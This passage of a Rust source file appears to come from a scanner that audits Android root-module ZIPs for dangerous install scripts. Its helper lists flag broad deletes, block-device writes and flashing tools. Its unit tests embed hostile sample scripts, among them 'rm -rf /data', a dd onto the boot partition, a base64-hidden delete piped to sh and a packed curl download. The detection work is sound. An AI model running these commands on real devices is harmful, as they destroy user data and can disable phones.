            let active = format!("/data/adb/modules/{id}");
            let updated = format!("/data/adb/modules_update/{id}");
            path == active
                || path.starts_with(&format!("{active}/"))
                || path == updated
                || path.starts_with(&format!("{updated}/"))
        })
}

fn is_broad_delete(path: &str) -> bool {
    matches!(
        path.trim_end_matches('/'),
        "" | "/"
            | "/data"
            | "/data/adb"
            | "/data/adb/modules"
            | "/data/adb/modules_update"
            | "/system"
            | "/vendor"
            | "/product"
            | "/odm"
            | "/system_ext"
    ) || path.ends_with("/*")
}

fn is_block_device_path(path: &str) -> bool {
    path.starts_with("/dev/block/")
        || path.starts_with("/dev/mapper/")
        || path.starts_with("/dev/bootdevice/")
        || path.starts_with("/dev/mmcblk")
        || path.starts_with("/dev/mtd")
        || path
            .strip_prefix("/dev/sd")
            .is_some_and(|tail| !tail.is_empty())
}

fn is_destructive_writer(name: &str) -> bool {
    name == "blkdiscard"
        || name == "wipefs"
        || name == "flash_erase"
        || name == "nandwrite"
        || name == "mtd"
        || name == "truncate"
        || name == "fallocate"
        || name == "cp"
        || name == "mv"
        || name == "tee"
        || name.starts_with("mkfs")
}

fn is_flash_writer(name: &str) -> bool {
    matches!(
        name,
        "blkdiscard"
            | "wipefs"
            | "flash_erase"
            | "flash_image"
            | "nandwrite"
            | "write_raw_image"
            | "mtd"
            | "fastboot"
    ) || name.starts_with("mkfs")
}

fn contains_unresolved_variable(value: &str) -> bool {
    value.contains('$')
}

fn is_safe_zip_path(path: &str) -> bool {
    !path.is_empty()
        && !path.starts_with('/')
        && !path.starts_with('\\')
        && !path.split('/').any(|component| component == "..")
}

fn parse_module_id(bytes: &[u8]) -> Option<String> {
    String::from_utf8_lossy(bytes).lines().find_map(|line| {
        let (key, value) = line.split_once('=')?;
        (key.trim() == "id").then(|| value.trim().to_owned())
    })
}

fn sha256_bytes(bytes: &[u8]) -> String {
    hex_digest(Sha256::digest(bytes).as_slice())
}

fn hex_digest(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut output = String::with_capacity(bytes.len() * 2);
    for byte in bytes {
        output.push(char::from(HEX[usize::from(byte >> 4)]));
        output.push(char::from(HEX[usize::from(byte & 0x0f)]));
    }
    output
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::{Compression, write::GzEncoder};
    use std::io::{Cursor, Write};
    use zip::write::SimpleFileOptions;

    fn rules(report: &AuditReport) -> Vec<&str> {
        report
            .findings
            .iter()
            .map(|finding| finding.rule_id.as_str())
            .collect()
    }

    fn gzip(bytes: &[u8]) -> Vec<u8> {
        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder.write_all(bytes).unwrap();
        encoder.finish().unwrap()
    }

    fn gzexe(payload: &[u8]) -> Vec<u8> {
        let stub =
            b"#!/system/bin/sh\nskip=5\ntail -n +$skip <\"$0\" | gzip -cd > /tmp/x\n/tmp/x\n";
        let mut output = stub.to_vec();
        output.extend(gzip(payload));
        output
    }

    fn module_zip(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let cursor = Cursor::new(Vec::new());
        let mut writer = zip::ZipWriter::new(cursor);
        for (path, bytes) in entries {
            writer
                .start_file(*path, SimpleFileOptions::default())
                .unwrap();
            writer.write_all(bytes).unwrap();
        }
        writer.finish().unwrap().into_inner()
    }

    #[test]
    fn detects_partition_writes_and_broad_delete() {
        let script = b"#!/system/bin/sh\nBLOCK=/dev/block/by-name/boot\nbusybox dd if=boot.img of=$BLOCK\nrm -rf /data\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
        assert!(rules(&report).contains(&RULE_BROAD_DELETE));
        assert!(report.has_critical());
        assert_eq!(report.required_confirmation_presses(), 2);
    }

    #[test]
    fn module_owned_delete_is_info() {
        let script = b"#!/system/bin/sh\nrm -rf \"$MODPATH/cache\"\n";
        let mut state = ScanState::default();
        scan_artifact(
            Artifact {
                path: "customize.sh".to_owned(),
                bytes: script.to_vec(),
                provenance: Vec::new(),
                depth: 0,
            },
            Some("example"),
            &AuditConfig::default(),
            &mut state,
        );
        assert_eq!(state.findings.len(), 1);
        assert_eq!(state.findings[0].rule_id, RULE_OWN_DELETE);
        assert_eq!(state.findings[0].severity, Severity::Info);
    }

    #[test]
    fn recursively_audits_gzexe_payloads() {
        let inner = b"#!/system/bin/sh\ncurl https://example.com/payload\nrm -rf /system\n";
        let packed = gzexe(&gzexe(inner));
        let report = scan_file_bytes("service.sh", &packed, &AuditConfig::default());
        assert_eq!(report.derived_artifacts, 2);
        assert!(rules(&report).contains(&RULE_PACKED_SHELL));
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE)
            .unwrap();
        assert_eq!(delete.provenance.len(), 2);
        assert!(rules(&report).contains(&RULE_NETWORK));
    }

    #[test]
    fn unpacking_limit_is_reported() {
        let packed = gzexe(&gzexe(b"#!/system/bin/sh\necho done\n"));
        let config = AuditConfig {
            max_unpack_depth: 1,
            ..AuditConfig::default()
        };
        let report = scan_file_bytes("service.sh", &packed, &config);
        assert!(rules(&report).contains(&RULE_UNPACK_LIMIT));
    }

    #[test]
    fn corrupt_gzip_is_reported_as_uninspectable() {
        let report = scan_file_bytes(
            "service.sh.gz",
            b"\x1f\x8bthis is not a gzip stream",
            &AuditConfig::default(),
        );
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_UNPACK_LIMIT)
            .unwrap();
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn audits_static_base64_shell_payload() {
        let script = b"#!/system/bin/sh\necho 'cm0gLXJmIC9kYXRhCg==' | base64 -d | sh\n";
        let report = scan_file_bytes("service.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PACKED_SHELL));
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE)
            .unwrap();
        assert_eq!(delete.provenance, ["base64 shell payload (layer 1)"]);
    }

    #[test]
    fn audits_literal_shell_command() {
        let script = b"#!/system/bin/sh\nsh -c 'rm -rf /vendor'\n";
        let report = scan_file_bytes("service.sh", script, &AuditConfig::default());
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
            .unwrap();
        assert_eq!(delete.provenance, ["literal dynamic shell (layer 1)"]);
    }

    #[test]
    fn follows_find_block_assignment() {
        let script = b"#!/system/bin/sh\nBOOT=$(find_block boot)\ndd if=boot.img of=$BOOT\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
    }

    #[test]
    fn detects_redirection_to_block_device() {
        let script = b"#!/system/bin/sh\ngzip -dc boot.img.gz > /dev/block/by-name/boot\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
    }

    #[test]
    fn warns_about_partition_alias_flash_tool() {
        let script = b"#!/system/bin/sh\nflash_image boot boot.img\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_FLASH_TOOL));
    }

    #[test]
    fn correlates_binary_presence_and_execution() {
        let mut elf = vec![0_u8; 64];
        elf[..6].copy_from_slice(b"\x7fELF\x02\x01");
        elf[16..18].copy_from_slice(&2_u16.to_le_bytes());
        let zip = module_zip(&[
            ("module.prop", b"id=audit_binary\n"),
            (
                "service.sh",
                b"#!/system/bin/sh\n$MODPATH/bin/helper --start\n",
            ),
            ("bin/helper", &elf),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(rules(&report).contains(&RULE_BINARY_PRESENT));
        assert!(rules(&report).contains(&RULE_BINARY_EXECUTED));
    }

    #[test]
    fn readme_url_is_not_network_behavior() {
        let report = scan_file_bytes(
            "README.md",
            b"Documentation: https://example.com\n",
            &AuditConfig::default(),
        );
        assert!(!rules(&report).contains(&RULE_NETWORK));
        assert_eq!(report.required_confirmation_presses(), 0);
    }
}
